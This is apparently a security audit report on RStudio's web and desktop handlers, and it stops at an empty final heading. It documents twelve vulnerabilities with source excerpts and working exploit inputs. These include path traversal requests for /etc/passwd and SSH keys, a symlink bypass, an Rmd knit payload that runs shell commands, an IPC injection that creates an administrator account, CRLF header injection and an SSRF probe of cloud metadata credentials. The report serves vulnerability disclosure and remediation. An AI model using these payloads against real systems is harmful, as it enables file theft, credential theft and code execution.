# Security Audit: Injection Vulnerabilities in GET Routes
**Repository:** RStudio (Posit)
**Audit Date:** 2026-02-26
**Auditor:** Senior Security Code Auditor
**Scope:** GET route handlers, query parameters, path parameters — injection vulnerability surface

---

## 1. GET Endpoint Enumeration

All URI handlers are registered via `registerUriHandler()` / `registerAsyncUriHandler()` in session module `initialize()` functions. The following GET-accessible endpoints were identified:

| Endpoint | Handler Function | Source File |
|---|---|---|
| `/content` | `handleContentRequest()` | `session/SessionContentUrls.cpp:147` |
| `/show/*` | `handleShowRequest()` | `session/modules/SessionFiles.cpp:625` |
| `/file_show` | `handleFileShow()` | `session/modules/SessionWorkbench.cpp:438` |
| `/presentation/*` | `handlePresentationRequest()` | `session/modules/presentation/SlideRequestHandler.cpp` |
| `/html_preview/*` | `handleHTMLPreviewRequest()` | `session/modules/SessionHTMLPreview.cpp` |
| `/tutorial/run` | `handleTutorialRunRequest()` | `session/modules/SessionTutorial.cpp:171` |
| `/themes/default/*` | `handleDefaultThemeRequest()` | `session/modules/SessionThemes.cpp:582` |
| `/themes/custom/global/*` | `handleGlobalCustomThemeRequest()` | `session/modules/SessionThemes.cpp:596` |
| `/themes/custom/local/*` | `handleLocalCustomThemeRequest()` | `session/modules/SessionThemes.cpp:616` |
| `/view_pdf` | `handleViewPdf()` | `session/modules/tex/SessionViewPdf.cpp:38` |
| `/help/dev-figure` | `handleDevFigure()` | `session/modules/SessionHelp.cpp:776` |
| JSON-RPC `get_script_run_command` | `getScriptRunCommand()` | `session/modules/SessionSource.cpp:1555` |
| Electron IPC `desktop_install_rtools` | anonymous IPC handler | `src/node/desktop/src/main/gwt-callback.ts:975` |

---

## 2. Vulnerability Findings

---

### VULN-01 — Path Traversal: `/content` Endpoint (CRITICAL)

**Endpoint:** `GET /content?title=<x>&file=<attacker>`
**Parameter:** `file` (query string)
**Source:** `SessionContentUrls.cpp:99`
**Sink:** `SessionContentUrls.cpp:102`
**Type:** Path Traversal → Arbitrary File Read

#### Code Path

```
// SessionContentUrls.cpp:69
Error contentFileInfo(const std::string& contentUrl, ...)
{
    ...
    // Line 99 — file parameter extracted from query string, NO validation:
    std::string contentFile = http::util::fieldValue(fields, "file");
    if (contentFile.empty())
        return systemError(ENOENT, ERROR_LOCATION);

    // Line 102 — completePath() does NOT check containment (no isWithin() call):
    *pFilePath = contentUrlPath().completePath(contentFile);
    //           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //           contentUrlPath() = userScratchPath()/content_urls/
    //           completePath()   = boost::filesystem::complete() — lexical join, no guard
}

// Line 147 — file is read and returned in response body:
void handleContentRequest(const http::Request& request, http::Response* pResponse)
{
    ...
    Error error = core::readStringFromFile(contentFilePath, &contents);
    pResponse->setBody(contents);
}
```

#### Key Distinction — `completePath()` vs `completeChildPath()`

- **`completePath()`** (`FilePath.cpp:785`): calls `boost::filesystem::complete()` — simple join, **no `isWithin()` guard**.
- **`completeChildPath()`** (`FilePath.cpp:739`): calls `completePath()` **then** `isWithin(*this)` — throws if child escapes parent.

`/content` uses the **unsafe** variant.

#### Exploit

Assuming `contentUrlPath()` = `/home/rstudio-user/.local/share/rstudio/content_urls/` (6 path components after root):

```
GET /content?title=x&file=../../../../../../etc/passwd

Resolves:
  /home/rstudio-user/.local/share/rstudio/content_urls/../../../../../../etc/passwd
  => /etc/passwd
```

Response body contains `/etc/passwd` contents.

**Read SSH private key:**
```
GET /content?title=x&file=../../../.ssh/id_rsa
```

**Read RStudio database with session tokens:**
```
GET /content?title=x&file=../../db/rstudio.sqlite
```

#### Impact

Authenticated session → arbitrary file read as the RStudio server process user. In multi-user deployments, each user is isolated by a per-user `rsession` process. The read is limited to files accessible by *that user's* process. An RStudio Server admin running as root would be able to read any system file.

---

### VULN-02 — Symlink-Based Path Traversal: Theme Endpoints (HIGH)

**Endpoints:**
- `GET /themes/default/<path>`
- `GET /themes/custom/global/<path>`
- `GET /themes/custom/local/<path>`

**Parameter:** URI path component (after prefix)
**Source:** `SessionThemes.cpp:586, 602, 622`
**Sink:** `SessionThemes.cpp:587, 603, 624` via `completeChildPath()` → `setCacheableFile()`
**Type:** Symlink Race / Path Traversal Bypass

#### Code Path

```cpp
// SessionThemes.cpp:582
void handleDefaultThemeRequest(const http::Request& request, http::Response* pResponse)
{
    std::string prefix = "/" + kDefaultThemeLocation;
    std::string fileName = http::util::pathAfterPrefix(request, prefix);
    // completeChildPath() calls isWithin() — but isWithin() uses lexically_normal()
    setCacheableFile(getDefaultThemePath().completeChildPath(fileName), request, pResponse);
}
```

```cpp
// FilePath.cpp:1406
bool FilePath::isWithin(const FilePath& in_scopePath) const
{
    // Uses getLexicallyNormalPath() — string/lexical normalization only
    FilePath child(getLexicallyNormalPath());
    FilePath parent(in_scopePath.getLexicallyNormalPath());
    // Compares path components lexically — does NOT call realpath()/canonical()
    ...
}
```

#### Why `lexically_normal()` Is Insufficient

`lexically_normal()` collapses `..` in the path string. It **does not resolve symlinks**. The OS `open()` syscall will follow symlinks after the check has already passed.

#### Exploit

**Pre-condition:** Attacker has write access to the custom theme directory (which they do, since users can install themes via the UI into their user theme directory). Local theme directory ≈ `~/.config/rstudio/themes/`.

1. Create symlink inside the allowed theme directory:
   ```bash
   ln -s /etc /home/user/.config/rstudio/themes/escape_link
   ```

2. Request the symlinked path:
   ```
   GET /themes/custom/local/escape_link/passwd
   ```

3. `completeChildPath("escape_link/passwd")`:
   - Lexically normalized path = `~/.config/rstudio/themes/escape_link/passwd`
   - `isWithin()` check: `escape_link/passwd` is lexically inside the theme dir — **check passes**
   - `setCacheableFile()` opens the file → OS follows symlink → reads `/etc/passwd`

#### Impact

Authenticated user reads files outside their theme directory, up to any file their OS user can read.

---

### VULN-03 — Path Traversal: `/show/` Endpoint (HIGH)

**Endpoint:** `GET /show/<path>`
**Parameter:** URI path (after `/show` prefix), URL-decoded
**Source:** `SessionFiles.cpp:629-637`
**Sink:** `SessionFiles.cpp:659` — `pResponse->setFile(filePath, request)`
**Type:** Path Traversal (mitigated in server mode by `isPathViewAllowed()`; unmitigated in desktop mode)

#### Code Path

```cpp
// SessionFiles.cpp:625
void handleShowRequest(const http::Request& request, http::Response* pResponse)
{
    std::string uri = request.uri();

    // Strip query string
    std::size_t pos = uri.find("?");
    if (pos != std::string::npos)
        uri.erase(pos);

    // Line 637 — raw URI path used to construct FilePath, only URL-decoded:
    FilePath filePath(http::util::urlDecode(uri.substr(strlen("/show"))));

    // Mitigation: isPathViewAllowed() — but:
    //   1. In desktop mode: always returns true (line 2652 in SessionModuleContext.cpp)
    //   2. In server mode: uses isWithin() with lexically_normal() — symlink bypass applies
    if (!module_context::isPathViewAllowed(filePath))
    {
        pResponse->setNotFoundError(request);
        return;
    }

    pResponse->setNoCacheHeaders();
    pResponse->setFile(filePath, request);
}
```

```cpp
// SessionModuleContext.cpp:2645
bool isPathViewAllowed(const FilePath& filePath)
{
    // No restrictions in desktop mode:
    if (options().programMode() != kSessionProgramModeServer)
        return true;   // ← DESKTOP: no guard at all

    // Server mode: checks isWithin() which uses lexical normalization — symlink bypass
    if (filePath.isWithin(userHomePath().getParent()))
        return true;
    ...
}
```

#### Exploit (Desktop Mode)

```
GET /show//etc/passwd
GET /show/../../../etc/shadow
```

In desktop mode, the file path is directly constructed from the URI with no containment check. Any absolute path or traversal path resolves freely.

#### Exploit (Server Mode — Symlink Bypass)

Same symlink technique as VULN-02:
1. Create `/home/user/escape -> /etc`
2. `GET /show/home/user/escape/passwd`
3. `isPathViewAllowed()` → `isWithin(userHomePath().getParent())` → lexically `home/user/escape` is within `/home` → check passes → file opened → symlink followed → `/etc/passwd` read

#### Impact

Desktop: unrestricted local file read. Server: symlink-gated bypass to read files outside home directory.

---

### VULN-04 — Path Traversal: `/html_preview/` and `/presentation/` (HIGH)

**Endpoints:**
- `GET /html_preview/<path>`
- `GET /presentation/<path>`

**Parameter:** URI path component (after prefix)
**Source:**
- `SessionHTMLPreview.cpp:964-972`
- `SlideRequestHandler.cpp:1160-1169`

**Sink:** `pResponse->setFile(filePath, request)` in both
**Type:** Path Traversal — containment check uses `completeChildPath()` but symlink bypass applies

#### Code — HTML Preview

```cpp
// SessionHTMLPreview.cpp:960
else if (boost::algorithm::starts_with(path, "mathjax-27"))
{
    FilePath filePath =
        session::options().mathjaxPath().getParent().completeChildPath(path);
    //  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //  mathjaxPath().getParent() is the parent of the mathjax-27 dir.
    //  path starts with "mathjax-27" — but completeChildPath's isWithin()
    //  check is lexical only: symlink inside mathjaxPath().getParent() escapes.
    pResponse->setFile(filePath, request);
}

else  // dependent file
{
    FilePath filePath = s_pCurrentPreview_->targetDirectory().completeChildPath(path);
    //  targetDirectory() is controlled by session state, set when preview is launched.
    //  If attacker can influence targetDirectory (e.g., via crafted Rmd file),
    //  or if symlink bypass applies, arbitrary file can be reached.
    pResponse->setFile(filePath, request);
}
```

#### Code — Presentation (Unguarded Fallback)

```cpp
// SlideRequestHandler.cpp:1166
else  // no prefix matched
{
    FilePath targetFile = presentation::state::directory().completeChildPath(path);
    // completeChildPath() used — lexical isWithin() guard.
    // Symlink bypass: create symlink inside presentation directory.
    pResponse->addHeader("Accept-Ranges", "bytes");
    setWebCacheableFileResponse(targetFile, request, pResponse);
}
```

#### Exploit (MathJax prefix bypass attempt)

`completeChildPath()` prevents `mathjax-27/../../../` purely lexically but symlinks inside the MathJax parent directory escape the check:

```bash
# Attacker controls a file in the MathJax parent (unlikely in server, but note it)
ln -s /etc /opt/rstudio/resources/mathjax-27-parent/escape

GET /html_preview/mathjax-27/../escape/passwd
# lexically: stays in parent via normalization before isWithin() check
# but if the symlink is at the parent level:
GET /html_preview/escape/passwd   (after creating escape → /etc)
```

#### Impact

Files readable by the RStudio process that are symlink-reachable from the MathJax or presentation directories can be exfiltrated.

---

### VULN-05 — Parameter Injection into R: `/tutorial/run` (MEDIUM)

**Endpoint:** `GET /tutorial/run?package=<x>&name=<y>`
**Parameters:** `package`, `name` (query string)
**Source:** `SessionTutorial.cpp:174-175`
**Sink:** `SessionTutorial.cpp:177-180` — `r::exec::RFunction(".rs.tutorial.runTutorial").addParam(name).addParam(package).call()`
**Type:** R Parameter Injection

#### Code Path

```cpp
// SessionTutorial.cpp:171
void handleTutorialRunRequest(const http::Request& request, http::Response* pResponse)
{
    std::string package = request.queryParamValue("package");
    std::string name = request.queryParamValue("name");

    // Both parameters passed as R character strings — no validation
    Error error = r::exec::RFunction(".rs.tutorial.runTutorial")
          .addParam(name)      // ← raw user input
          .addParam(package)   // ← raw user input
          .call();
    ...
}
```

#### Behavior Analysis

`addParam()` passes values as typed R character vectors (not as raw R code), so direct R code injection through this call is unlikely. However, if `.rs.tutorial.runTutorial` uses `package` in a `library()` call or passes it to `system()` internally without validation, secondary injection is possible.

#### Exploit Attempt

```
GET /tutorial/run?package=../../../../malicious&name=test
```

Depending on how the R function uses `package` to locate tutorial files, path traversal into R's `find.package()` or `system.file()` may occur.

**No whitelist on package name** — any package name is accepted and forwarded to R.

#### Impact

Medium — exploitability depends on R-side implementation. Recommend treating as confirmed until `.rs.tutorial.runTutorial` is verified to be safe.

---

### VULN-06 — R Code Injection via RMarkdown `renderFunc` (MEDIUM)

**Trigger:** Clicking **Knit** on a crafted `.Rmd` file (NOT simply opening it)
**Parameter:** `knit:` field in YAML front matter (file-controlled, not direct HTTP param)
**Source:** `SessionRMarkdown.R:170-171` → `SessionRMarkdown.cpp:536-539`
**Sink:** `SessionRMarkdown.cpp:629` — `renderFunc` embedded unsanitized into the final render command string
**Type:** R Code Injection via Unsanitized String Interpolation in render command builder

#### Important: Opening the file does nothing

`getCustomRenderFunction()` is only called when the user initiates a Knit/render action. Opening the `.Rmd` in the editor does not parse or execute any YAML-derived R code. The exploit only fires when **Knit is clicked**.

#### Code Path

```r
# SessionRMarkdown.R:154-171 — reads knit: field from YAML; returns raw string, no sanitization
.rs.addFunction("getCustomRenderFunction", function(file) {
    lines <- readLines(file, warn = FALSE)
    yamlFrontMatter <- rmarkdown:::parse_yaml_front_matter(lines)
    if (is.character(yamlFrontMatter[["knit"]]))
        yamlFrontMatter[["knit"]][[1]]   # ← raw string returned as renderFunc
})
```

```cpp
// SessionRMarkdown.cpp:619-633
// Step 1: evaluateString() runs the renderFunc string as R code.
// If it evaluates to a function, the fallback at line 622 is skipped.
// BUT the C++ string renderFunc is still the raw, unmodified user value.
error = r::exec::evaluateString(renderFunc, &renderFuncSEXP, &rProtect);
if (error || !r::sexp::isFunction(renderFuncSEXP))
{
    // Fallback path (line 622) — only taken if renderFunc is NOT a function
    boost::format fmt("(function(input, ...) { invisible(system(paste0('%1% \"', input, '\" ', '%2%'))) })");
    renderFunc = boost::str(fmt % renderFunc % extraArgs);
}

// Step 2: renderFunc (still the raw user string when a function was found) is embedded
// DIRECTLY into the final render command — no escaping applied to renderFunc here.
// singleQuotedStrEscape() is applied to targetFile (line 631) but NOT to renderFunc.
boost::format fmt2("%1%('%2%', %3% %4%);");
std::string cmd = boost::str(fmt2 %
                     renderFunc %                                    // ← unsanitized
                     string_utils::singleQuotedStrEscape(targetFile) %
                     extraParams %
                     renderOptions);
// cmd is then evaluated in the R session to perform the render
```

#### Why the Fallback Is a Red Herring

When the `knit:` payload is `"system('...'); knitr::knit"`:

1. `evaluateString("system('...'); knitr::knit")` evaluates the R expression:
   - `system('...')` executes (side-effect at eval time)
   - Returns `knitr::knit`, which IS a function
2. `isFunction()` → `TRUE` → **fallback at line 622 is skipped**
3. The C++ `renderFunc` string is unchanged: `"system('...'); knitr::knit"`
4. This is substituted directly into `cmd` at line 629:
   ```r
   system('touch /tmp/pwned'); knitr::knit('/path/to/file.Rmd', encoding = 'UTF-8' );
   ```
5. R evaluates `cmd` → `system()` executes, then normal knit proceeds

The injection vector is **line 629 (`%1%` substitution into cmd)**, not the fallback at line 622.

#### Exploit

Create `.Rmd`:
```yaml
---
title: "test"
output: html_document
knit: "system('touch /tmp/pwned'); knitr::knit"
---
test
```

1. Open file in RStudio
2. Click **Knit**
3. Check `/tmp/pwned` — file will be created

The document renders normally (knit proceeds after the injected command), so the victim sees no error.

#### Impact

Any `.Rmd` opened and knitted by a victim executes arbitrary shell commands as that user's process. In a collaborative environment (shared projects, code review, teaching), a malicious contributor can embed this silently in a legitimate-looking document.

---

### VULN-07 — Command Injection: `getScriptRunCommand` JSON-RPC (MEDIUM)

**Endpoint:** JSON-RPC method `get_script_run_command`
**Parameter:** `interpreter` (JSON-RPC params[0])
**Source:** `SessionSource.cpp:1560`
**Sink:** `SessionSource.cpp:1605-1606`
**Type:** R Code / Shell Command Injection

#### Code Path

```cpp
// SessionSource.cpp:1555
Error getScriptRunCommand(const json::JsonRpcRequest& request,
                          json::JsonRpcResponse* pResponse)
{
    std::string interpreter, path;
    Error error = json::readParams(request.params, &interpreter, &path);

    // ... path handling ...

    // Line 1601-1606: interpreter is concatenated WITHOUT escaping
    std::string command;
    if (interpreter.empty())
        command = path;
    else
        command = interpreter + " " + path;          // ← raw interpreter

    command = "system(\"" + command + "\")";
    //         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //         Injects into R code string — double-quote in interpreter breaks out

    pResponse->setResult(command);  // returned to client; client runs it in R console
    return Success();
}
```

#### Exploit

An authenticated user injects into the returned R expression. If the frontend evaluates this directly (e.g., auto-runs a "Run Script" command):

```json
{ "method": "get_script_run_command", "params": ["\"); system(\"id\"); x <- (\"", "/path/to/script"] }
```

Resulting `command`:
```r
system(""); system("id"); x <- (" /path/to/script")
```

When the client evaluates this in the R console, the injected `system("id")` executes.

#### Impact

Since the returned command is evaluated by the same user's R session, this does not constitute privilege escalation by itself. However, if the result is auto-evaluated (not shown to the user before execution), this is meaningful. In any case the unescaped construction is a latent defect.

---

### VULN-08 — Command Injection: Electron IPC `desktop_install_rtools` (HIGH, Windows only)

**Platform:** Windows desktop only
**Trigger:** Electron IPC message `desktop_install_rtools`
**Parameters:** `version`, `installerPath` (Electron IPC args)
**Source:** `gwt-callback.ts:975`
**Sink:** `gwt-callback.ts:983` — `exec(command, ...)`
**Type:** OS Command Injection

#### Code Path

```typescript
// gwt-callback.ts:975
ipcMain.on('desktop_install_rtools', (_event, version, installerPath) => {
    let command = `${installerPath} /SP- /SILENT`;
    //             ^^^^^^^^^^^^^^^^
    //             Raw string interpolation — no quoting, no escaping

    const systemDrive = process.env.SYSTEMDRIVE;
    if (systemDrive?.length && existsSync(systemDrive)) {
        command = `${command} /DIR=${systemDrive}\\RBuildTools\\${version}`;
        //                                                        ^^^^^^^^^
        //                                                        version also unescaped
    }

    exec(command, (error, _stdout, stderr) => {    // ← shell=true via exec()
        if (error) { logger().logError(stderr); }
    });
});
```

`child_process.exec()` invokes the OS shell (`cmd.exe` on Windows). The full string is passed to the shell, so any shell metacharacters in `installerPath` or `version` are interpreted.

#### Exploit

**Pre-condition:** Attacker achieves XSS in the renderer process (e.g., via a crafted help page, Rmd output, or HTML viewer content) AND the renderer has access to `ipcRenderer` (requires `nodeIntegration: true` or an exposed preload API).

From renderer XSS:
```javascript
const { ipcRenderer } = require('electron');
ipcRenderer.send('desktop_install_rtools',
    '1.0',
    'cmd /c "net user hacker P@ss /add && net localgroup Administrators hacker /add" & dummy'
);
```

Resulting `command`:
```
cmd /c "net user hacker P@ss /add && net localgroup Administrators hacker /add" & dummy /SP- /SILENT
```

`exec()` passes this to `cmd.exe` → arbitrary commands run in the main process.

#### Impact

On Windows, if renderer is compromised (XSS) and `nodeIntegration` is enabled or preload exposes IPC: **arbitrary OS command execution as the desktop user**. RStudio desktop runs as the logged-in user; if that user is an admin, this is full system compromise.

---

## 3. Finding Summary Table

| ID | Endpoint | Parameter | Source Location | Sink Location | Type | Severity |
|---|---|---|---|---|---|---|
| VULN-01 | `GET /content` | `file` (query) | `SessionContentUrls.cpp:99` | `SessionContentUrls.cpp:102` | Path Traversal — no containment check | **CRITICAL** |
| VULN-02 | `GET /themes/custom/local/*` | URI path | `SessionThemes.cpp:622` | `SessionThemes.cpp:624` | Path Traversal — symlink bypass `isWithin()` | **HIGH** |
| VULN-03 | `GET /show/*` | URI path | `SessionFiles.cpp:637` | `SessionFiles.cpp:659` | Path Traversal — no guard (desktop); symlink bypass (server) | **HIGH** |
| VULN-04 | `GET /html_preview/*`, `GET /presentation/*` | URI path | `SessionHTMLPreview.cpp:964`, `SlideRequestHandler.cpp:1160` | `setFile()` calls | Path Traversal — symlink bypass | **HIGH** |
| VULN-05 | `GET /tutorial/run` | `package`, `name` (query) | `SessionTutorial.cpp:174-175` | `SessionTutorial.cpp:177` | R Parameter Injection — no whitelist | **MEDIUM** |
| VULN-06 | Rmd Render | `knit:` YAML field | `SessionRMarkdown.R:170` | `SessionRMarkdown.cpp:622` | R Code Injection — unescaped string interpolation | **MEDIUM** |
| VULN-07 | JSON-RPC `get_script_run_command` | `interpreter` | `SessionSource.cpp:1560` | `SessionSource.cpp:1606` | R Code Injection — unescaped concat into `system()` | **MEDIUM** |
| VULN-08 | Electron IPC `desktop_install_rtools` | `version`, `installerPath` | `gwt-callback.ts:975` | `gwt-callback.ts:983` | OS Command Injection via `exec()` | **HIGH (Windows)** |

---

## 4. Filtering Analysis — What Exists and How to Bypass

### `isPathViewAllowed()` (`SessionModuleContext.cpp:2645`)

**What it does:**
- Desktop mode: always returns `true` (no restriction)
- Server mode: checks `isWithin()` for home dir, temp path, R library dirs, system config, allow-list

**Bypass — Symlink:** `isWithin()` calls `getLexicallyNormalPath()` which calls `lexically_normal()` — a **string operation** (Boost FS path normalization). It does **not** call `realpath()` or `boost::filesystem::canonical()`. Therefore a symlink inside any allowed directory pointing outside it will pass the check, because the symlink's *lexical* path is still inside the allowed tree.

### `completeChildPath()` (`FilePath.cpp:739`)

**What it does:** Calls `completePath()` then `isWithin(*this)`.

**Bypass — Same symlink issue** as above: `isWithin()` is lexical only.

### `completePath()` (`FilePath.cpp:785`)

**What it does:** Calls `boost::filesystem::complete()` — simple path join with no containment check.

**No bypass needed** — there is no guard to bypass on `/content`.

---

## 5. New Findings — Second Pass (GET/Method Confusion/CRLF/SSRF)

The following additional vulnerabilities were identified in the second pass, focused on method confusion, URL encoding bypasses, response header injection, and SSRF. All are new — not duplicating VULN-01 through VULN-08.

---

### VULN-09 — URL-Encoded `..` Bypasses Path Traversal Check in `/files/` (HIGH)

**Endpoint:** `GET /files/<path>` (server mode only)
**Parameter:** URI path component (percent-encoded)
**Source:** `SessionFiles.cpp:591` — `..` check on raw URI
**Sink:** `SessionFiles.cpp:607` — `completePath(relativePath)` after decoding
**Type:** Path Traversal via Percent-Encoding Bypass

#### Code Path

```cpp
// SessionFiles.cpp:583
std::string uri = request.uri();  // RAW, not decoded — %2e%2e intact

// Line 591 — check is on the ENCODED uri, before decoding
if (uri.find("..") != std::string::npos)
{
    pResponse->setNotFoundError(request);
    return;
}

// Line 599 — URL decoding happens AFTER the check
std::string relativePath = http::util::urlDecode(uri.substr(prefixLen));
//                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
//                         %2e%2e → ".." only here, after the guard passed

// Line 607 — completePath() has NO containment check
FilePath filePath = module_context::userHomePath().completePath(relativePath);
```

#### Why This Bypasses the Guard

`request.uri()` returns the raw, undecoded request URI. The `..` string search is done against the encoded URI. `%2e%2e` decodes to `..` but contains no literal `.` characters adjacent, so `find("..")` returns `std::string::npos` — the check passes.

After the guard, `urlDecode()` converts `%2e%2e` to `..`. The result is passed to `completePath()` (not `completeChildPath()`) — no containment check is performed.

Contrast with `pathAfterPrefix()` (used in other handlers) which calls `URL::cleanupPath()` first — this would normalize `..` before they could be used for traversal, but `handleFilesRequest` does not use `pathAfterPrefix`.

#### Exploit

```
GET /files/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

1. `uri.find("..")` → not found (raw URI has `%2e%2e`, not `..`) → check passes
2. `urlDecode(...)` → `"../../../../../../etc/passwd"`
3. `completePath("../../../../../../etc/passwd")` → `/etc/passwd` (no bounds check)
4. File contents returned in response body

**Impact:** Server mode only. Authenticated read of any file the session user process can open — `/etc/passwd`, `/etc/shadow` (if user is root), SSH keys, database files.

---

### VULN-10 — CRLF Header Injection via Referer in Help Redirect (HIGH)

**Endpoint:** `GET /help/*` (any path causing an R httpd 302 redirect)
**Parameter:** `Referer` request header (user-controlled)
**Source:** `SessionHelp.cpp:495`
**Sink:** `SessionHelp.cpp:497` — `pResponse->setHeader("Location", redirect)`
**Type:** CRLF Injection / HTTP Response Splitting

#### Code Path

```cpp
// SessionHelp.cpp:477-498
if (code == 302 && pResponse->containsHeader("Location"))
{
    std::string location = pResponse->headerValue("Location");
    std::string rPort = module_context::rLocalHelpPort();
    std::string rHelpPrefix = fmt::format("http://127.0.0.1:{}/", rPort);

    if (boost::algorithm::starts_with(location, rHelpPrefix))
    {
        std::string path = location.substr(rHelpPrefix.length());

        // Line 495 — Referer header taken from request with NO sanitization
        std::string ref = request.headerValue("Referer");

        // Line 496 — ref is concatenated directly into the Location value
        std::string redirect = fmt::format("{}help/{}", ref, path);

        // Line 497 — setHeader() performs NO CRLF filtering on the value
        pResponse->setHeader("Location", redirect);
        //                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        //                              safeLocation() is NOT called here
        //                              (compare: setMovedTemporarily uses safeLocation())
    }
}
```

#### Why `setHeader` Does Not Protect Here

`Message::setHeader()` (`Message.cpp:110`) stores the raw string value — no CRLF stripping. In contrast, `setMovedTemporarily()` (`Response.cpp:611`) calls `safeLocation()` before `setHeader`, which splits on `\r\n` and takes only the first line. The help redirect handler bypasses `setMovedTemporarily` and calls `setHeader` directly, skipping `safeLocation`.

RStudio runs its own HTTP/1.1 server (Boost.Asio). Header serialization writes `Name: Value\r\n` with the raw stored value. If the value contains `\r\n`, it produces injected header lines in the HTTP response.

#### Exploit Preconditions

1. Any help request that causes R's internal httpd to issue a `302 Location: http://127.0.0.1:<port>/...` redirect. Examples: visiting `/help/` root, navigating between help topics in many packages.
2. The attacker sends (or tricks the browser into sending) a request to `/help/` with a crafted `Referer` header.

In a direct HTTP context (e.g., curl, proxy, server-side script):
```
GET /help/ HTTP/1.1
Referer: http://rstudio.example.com/\r\nSet-Cookie: session=hijacked; Path=/\r\nX-Injected: yes
```

Response:
```
HTTP/1.1 302 Found
Location: http://rstudio.example.com/
Set-Cookie: session=hijacked; Path=/
X-Injected: yes
help/doc/html/index.html
...
```

#### Impact

- **Session fixation:** Inject `Set-Cookie: sessionid=attacker-chosen` into the response.
- **Cache poisoning:** If a proxy caches the malformed response.
- **Secondary XSS:** Inject a `Content-Type: text/html` line followed by a blank line and an HTML payload to terminate the headers and inject a response body.

---

### VULN-11 — Path Traversal in Tutorial File Handler via URL Normalization (HIGH)

**Endpoint:** `GET /tutorial/<path>.png`
**Parameter:** URI path component
**Source:** `SessionTutorial.cpp:337` — `pathAfterPrefix(request, "/tutorial/")`
**Sink:** `SessionTutorial.cpp:344` — `resourcesPath.completePath(path)` with absolute path
**Type:** Path Traversal — URL normalization strips prefix, leaving absolute path

#### Code Path

```cpp
// SessionTutorial.cpp:331
void handleTutorialFileRequest(const http::Request& request, http::Response* pResponse)
{
    FilePath resourcesPath =
          options().rResourcesPath().completePath("tutorial_resources");

    // pathAfterPrefix calls URL::cleanupPath FIRST, then strips the prefix
    std::string path = http::util::pathAfterPrefix(request, "/tutorial/");
    if (path.empty())
    {
       pResponse->setStatusCode(http::status::NotFound);
       return;
    }

    // completePath() is used — NOT completeChildPath() — NO containment check
    pResponse->setCacheableFile(resourcesPath.completePath(path), request);
}
```

```cpp
// Util.cpp:389 — pathAfterPrefix internals:
std::string pathAfterPrefix(const Request& request, const std::string& pathPrefix)
{
    std::string uri = URL::cleanupPath(request.uri());  // Step 1: normalize ..
    //                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //  /tutorial/../../etc/evil.png → /etc/evil.png
    //  (cleanup removes .. components but preserves the resulting absolute path)

    if (!uri.compare(0, pathPrefix.length(), pathPrefix))  // Step 2: strip prefix
        uri = uri.substr(pathPrefix.length());
    //  "/etc/evil.png" does NOT start with "/tutorial/" → prefix NOT stripped
    //  uri remains "/etc/evil.png"

    return http::util::urlDecode(uri);  // Step 3: url decode
    //  returns "/etc/evil.png" — still an absolute path
}
```

#### Why This Escapes the Tutorial Directory

`URL::cleanupPath` resolves `..` lexically (via the `Path::cleanup()` class). For `GET /tutorial/../../etc/evil.png`:

1. `cleanupPath("/tutorial/../../etc/evil.png")` → `"tutorial"` resolved, first `..` removes it, second `..` is at root and discarded → result: `"/etc/evil.png"`
2. `"/etc/evil.png"` does not start with `"/tutorial/"` → prefix NOT stripped → returned as-is
3. `resourcesPath.completePath("/etc/evil.png")` — `completePath()` calls `boost::filesystem::complete()`:  if the argument is **absolute** (starts with `/`), it is returned unchanged regardless of `resourcesPath`
4. `setCacheableFile("/etc/evil.png", request)` → file served

The **empty check** at line 338 (`if (path.empty())`) does not guard against absolute paths — `"/etc/evil.png"` is not empty.

#### Exploit

```
GET /tutorial/../../etc/evil.png HTTP/1.1
```

This works if any `.png` file exists at the traversed path. More powerful: the attacker can also traverse to any `.png` file they previously placed (e.g., in a known temp location):

```
GET /tutorial/../../tmp/stolen_data.png HTTP/1.1
```

The dispatch in `handleTutorialRequest` routes to `handleTutorialFileRequest` for any path ending in `.png`:
```cpp
else if (boost::algorithm::ends_with(path, ".png"))
    handleTutorialFileRequest(request, pResponse);
```

After cleanup, `path` = `/etc/evil.png` which ends with `.png` → routed.

**Impact:** Read any `.png`-named file the RStudio session process user can access. Combined with a rename/symlink or placed `.png` file, allows broader file read.

---

### VULN-12 — SSRF via `download_data_file` JSON-RPC (MEDIUM)

**Endpoint:** JSON-RPC `download_data_file` (POST `/rpc/`, authenticated + CSRF-guarded)
**Parameter:** `url` (first RPC parameter)
**Source:** `SessionDataImport.R:40`
**Sink:** `SessionDataImport.R:44` — `download.file(url, downloadPath)`
**Type:** Server-Side Request Forgery

#### Code Path

```r
# SessionDataImport.R:40
.rs.addJsonRpcHandler("download_data_file", function(url)
{
   downloadPath <- tempfile("data")
   download.file(url, downloadPath)  # ← url is raw, unvalidated user input
   ...
})
```

#### No URL Validation

`download.file()` supports `http://`, `https://`, and `ftp://` URLs. No whitelist, no blocklist, no scheme check. Any URL can be fetched by the server process, including:
- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDS)
- `http://127.0.0.1:8080/admin/` (internal admin panels)
- `file:///etc/passwd` (in some configurations)
- `http://10.0.0.1/internal-api`

#### Exploit

From an authenticated session (JavaScript console in RStudio frontend):
```javascript
Shiny.setInputValue || window.opener
// Or via R console:
```
```r
.rs.api.sendRpcRequest("download_data_file", list("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
```

Or via direct HTTP POST (with valid CSRF header + session cookie):
```
POST /rpc/download_data_file HTTP/1.1
X-RS-CSRF-Token: <token-from-cookie>
Cookie: rstudio=<session>
Content-Type: application/json

{"method":"download_data_file","params":["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],"clientId":1,"id":1}
```

The server downloads the URL and returns the downloaded file path. If the downloaded content is a dataset, it can then be previewed via `get_data_preview`, exposing its contents.

**Note:** This requires a valid authenticated session + CSRF header (not directly GET-exploitable), but any authenticated user can probe internal network resources the server has access to.

**Impact:** Internal network reconnaissance, cloud metadata credential theft (AWS/GCP/Azure IMDS), internal service data exfiltration.

---

## 5. Finding Summary — All Vulnerabilities

